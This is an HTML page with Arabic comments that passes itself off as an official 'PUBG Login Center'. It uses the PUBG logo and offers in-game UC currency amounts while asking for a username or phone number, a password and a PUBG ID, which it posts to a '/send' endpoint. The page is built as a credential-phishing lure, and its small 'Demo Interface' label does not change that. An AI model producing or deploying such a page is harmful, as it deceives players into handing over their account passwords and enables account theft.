<!DOCTYPE html>
<html lang="ar">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PUBG Login Center</title>

<style>

/* خلفية الصفحة */
body{
margin:0;
font-family:Arial;
background: url("https://images.unsplash.com/photo-1605901309584-818e25960a8f") no-repeat center center/cover;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
position:relative;
}

/* طبقة تغبيش */
.overlay{
position:absolute;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.65);
}

/* الصندوق */
.box{
position:relative;
z-index:2;
background:rgba(21,26,38,0.95);
padding:25px;
border-radius:15px;
width:340px;
text-align:center;
box-shadow:0 0 25px rgba(0,0,0,0.7);
}

/* لوجو */
.logo{
width:90px;
margin-bottom:10px;
}

/* عنوان */
h2{
color:#f9a825;
margin:10px 0;
}

/* نص */
p{
color:#ddd;
font-size:14px;
}

/* inputs */
input,select{
width:100%;
padding:12px;
margin-top:10px;
border:none;
border-radius:8px;

/* 🔥 حل مشكلة عدم ظهور الأرقام */
color:#000;
background:#fff;
font-size:14px;
outline:none;
}

/* زر */
button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:10px;
background:#f9a825;
color:black;
font-weight:bold;
cursor:pointer;
transition:0.3s;
}

button:hover{
background:#ffb300;
}

/* نص صغير */
.small{
font-size:12px;
color:#aaa;
margin-top:10px;
}

</style>

</head>

<body>

<div class="overlay"></div>

<div class="box">

<!-- PUBG LOGO -->
<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6e/PUBG_logo.svg">

<h2>PUBG LOGIN</h2>

<p>سجل الدخول للمتابعة</p>

<!-- الفورم -->
<form action="/send" method="POST">

<input type="text" name="name" placeholder="Username / Phone" required>

<input type="password" name="password" placeholder="Password" required>

<input type="text" name="pubg_id" placeholder="PUBG ID" required>

<select name="uc">
<option>60 UC</option>
<option>325 UC</option>
<option>660 UC</option>
<option>1800 UC</option>
</select>

<button type="submit">Login / Send</button>

</form>

<div class="small">
PUBG UC Center - Demo Interface
</div>

</div>

</body>
</html>
